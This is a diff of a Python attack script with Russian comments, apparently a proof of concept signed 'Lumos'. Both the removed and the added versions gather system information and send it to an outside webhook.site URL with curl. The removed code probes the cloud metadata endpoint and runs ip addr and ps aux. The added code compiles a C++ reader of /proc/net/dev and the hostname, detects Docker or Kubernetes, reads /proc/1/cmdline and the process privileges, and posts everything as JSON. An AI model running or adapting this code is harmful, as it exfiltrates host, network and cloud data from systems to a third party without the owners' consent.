@@ -1,71 +1,91 @@
 import subprocess
 import os
-import http.client
+import json
 
+# ТВОЙ ВЕБХУК
 WEBHOOK_URL = "https://webhook.site/6d6434ac-bcd7-48a4-901c-53ca63be0ec2"
 
-def get_cloud_data():
-    """Попытка вытащить реальные данные из метаданных облака."""
-    try:
-        conn = http.client.HTTPConnection("169.254.169.254", timeout=2)
-        # Запрашиваем список доступных метаданных
-        conn.request("GET", "/latest/meta-data/")
-        r = conn.getresponse()
-        if r.status == 200:
-            return r.read().decode()[:500] # Берем первые 500 символов
-    except:
-        return "No direct metadata response"
-    return "Metadata server timed out"
+cpp_source = r"""
+#include <iostream>
+#include <fstream>
+#include <string>
+#include <sstream>
 
-def get_network_info():
-    """Собираем данные о сетевом окружении."""
-    try:
-        # Показываем все интерфейсы и маршруты
-        ip_addr = subprocess.check_output(["ip", "addr"]).decode()
-        ip_route = subprocess.check_output(["ip", "route"]).decode()
-        return f"INTERFACES:\n{ip_addr}\n\nROUTES:\n{ip_route}"
-    except:
-        return "Could not retrieve network info"
-
-def run_attack():
-    print("[*] Harvesting sensitive data...")
+int main() {
+    std::stringstream ss;
+    ss << "--- [KERNEL NETWORK VIEW] ---\n";
     
-    # 1. Данные из облака
-    cloud_info = get_cloud_data()
+    // Читаем интерфейсы напрямую из ядра (не нужен ip addr)
+    std::ifstream netdev("/proc/net/dev");
+    std::string line;
+    if (netdev.is_open()) {
+        while (std::getline(netdev, line)) {
+            ss << line << "\n";
+        }
+    }
+
+    // Проверяем возможность управления ядром (sysctl)
+    std::ifstream hostname("/proc/sys/kernel/hostname");
+    std::string host;
+    if (hostname >> host) {
+        ss << "\n--- [HOST IDENTIFICATION] ---\n";
+        ss << "Hostname: " << host << "\n";
+    }
+
+    std::cout << ss.str();
+    return 0;
+}
+"""
+
+def run_poc():
+    # 1. Готовим C++ бинарник
+    with open("engine.cpp", "w") as f:
+        f.write(cpp_source)
     
-    # 2. Сетевая топология
-    net_info = get_network_info()
-    
-    # 3. Список процессов (чтобы видеть, что запущено на фоне)
+    subprocess.run(["g++", "-O3", "engine.cpp", "-o", "engine_bin"])
+
+    # 2. Собираем данные
     try:
-        ps_info = subprocess.check_output(["ps", "aux"]).decode()[:1000]
+        cpp_output = subprocess.check_output(["./engine_bin"]).decode()
     except:
-        ps_info = "PS command failed"
+        cpp_output = "C++ Execution Failed"
 
-    # Формируем читаемый и "пугающий" отчет
-    report = (
-        "========== [ LUMOS: CRITICAL SYSTEM BREACH ] ==========\n"
-        f"STATUS: ROOT IDENTIFIED (UID {os.getuid()})\n"
-        "------------------------------------------------------\n"
-        "[!] CLOUD METADATA EXPOSED:\n"
-        f"{cloud_info}\n"
-        "------------------------------------------------------\n"
-        "[!] NETWORK TOPOLOGY REVEALED:\n"
-        f"{net_info}\n"
-        "------------------------------------------------------\n"
-        "[!] RUNNING PROCESSES (Partial):\n"
-        f"{ps_info}\n"
-        "======================================================"
-    )
+    # Проверка на Docker/K8s окружение
+    is_container = "Unknown"
+    if os.path.exists("/.dockerenv"):
+        is_container = "Docker"
+    elif os.path.exists("/var/run/secrets/kubernetes.io"):
+        is_container = "Kubernetes"
 
-    # Отправляем в чистом виде, чтобы не было путаницы с кодировкой
+    # 3. Формируем JSON (это исправит синтаксис на вебхуке)
+    report_data = {
+        "status": "CRITICAL_SYSTEM_ACCESS",
+        "attacker": "Lumos",
+        "privileges": {
+            "uid": os.getuid(),
+            "gid": os.getgid(),
+            "is_root": os.getuid() == 0
+        },
+        "environment": {
+            "type": is_container,
+            "cwd": os.getcwd(),
+            "pid_1_cmd": open("/proc/1/cmdline").read().replace('\0', ' ')
+        },
+        "raw_payload": cpp_output
+    }
+
+    # 4. Отправка через CURL с JSON-заголовком
+    json_payload = json.dumps(report_data, indent=4)
+    
     subprocess.run([
         'curl', '-s', 
         '-X', 'POST', 
-        '--data-urlencode', f"payload={report}", 
+        '-H', 'Content-Type: application/json',
+        '-d', json_payload, 
         WEBHOOK_URL
     ])
-    print("[+] Critical data sent to webhook.")
+
+    print("[+] PoC Finished. Check your webhook for a clean JSON view.")
 
 if __name__ == "__main__":
-    run_attack()
+    run_poc()
